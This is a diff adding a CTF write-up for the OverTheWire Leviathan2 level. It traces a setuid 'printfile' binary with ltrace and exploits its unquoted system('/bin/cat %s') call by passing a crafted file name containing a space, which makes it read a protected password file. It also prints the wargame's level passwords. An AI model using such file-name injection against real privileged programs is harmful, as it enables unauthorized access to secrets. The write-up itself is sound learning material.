@@ -24,7 +24,7 @@ You'll land in the home directory of user levathan0 quick _la -la_ you'll see a 
 
 ![lev1](https://mbilalrizwan.github.io/MyCtfWriteups/assets/images/overthewire/lev1.png))
 
-:-------------------------------------------------------------------------------------
+|:-------------|:------------------|:------|
 
 ### Leviathan1
 
@@ -75,4 +75,79 @@ ougahZi8Ta
 ```
 
 
-:-------------------------------------------------------------------------------------
+|:-------------|:------------------|:------|
+
+
+### Leviathan2
+
+Using the same host + port  and password gotten from the last level login as user leviathan2.
+
+```bash
+leviathan2@leviathan:~$ ls
+printfile
+leviathan2@leviathan:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+
+
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+
+```
+
+Seems like there we can't read the leviathan3 file lets try creating a symlink to some directory that I( the user ) owns
+
+```bash
+leviathan2@leviathan:~$ mkdir /tmp/mytempdir
+leviathan2@leviathan:~$ cd /tmp/mytempdir
+leviathan2@leviathan:/tmp/mytempdir$ ln -s /etc/leviathan_pass/leviathan3
+leviathan2@leviathan:/tmp/mytempdir$ ls
+leviathan3
+
+leviathan2@leviathan:/tmp/mytempdir$ /home/leviathan2/printfile leviathan3
+You cant have that file...
+
+leviathan2@leviathan:/tmp/mytempdir$ ltrace /home/leviathan2/printfile leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
+access("leviathan3", 4)                                                = -1
+puts("You cant have that file..."You cant have that file...
+)                                     = 27
++++ exited (status 1) +++
+leviathan2@leviathan:/tmp/mytempdir$ echo "test" > file.txt
+leviathan2@leviathan:/tmp/mytempdir$ ltrace /home/leviathan2/printfile file.txt
+__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
+access("file.txt", 4)                                                  = 0
+snprintf("/bin/cat file.txt", 511, "/bin/cat %s", "file.txt")          = 17
+geteuid()                                                              = 12002
+geteuid()                                                              = 12002
+setreuid(12002, 12002)                                                 = 0
+system("/bin/cat file.txt"test
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                 = 0
++++ exited (status 0) +++
+
+```
+
+The sym link didnt help so what I did was used ltrace to find out what is actully happening in the background
+It turns out that `access()` function is actually used to check and verify the user id. and then 
+`snprintf()` is used to create a string which is then passed to `system()` to be executed as a system command & we can also see that cat is being used to read the file.
+
+Searching for vulnerabilites in `access()` function I stumbled upon [this](https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole)
+
+```bash
+leviathan2@leviathan:/tmp/mytempdir$ ls
+file  leviathan3
+leviathan2@leviathan:/tmp/mytempdir$ touch "leviathan3 file"
+leviathan2@leviathan:/tmp/mytempdir$ /home/leviathan2/printfile leviathan3\ file
+Ahdiemoo1j
+test
+leviathan2@leviathan:/tmp/mytempdir$
+
+```
+Lets move on to the nex tone.
+
+
+|:-------------|:------------------|:------|
+
+## Leviathan3
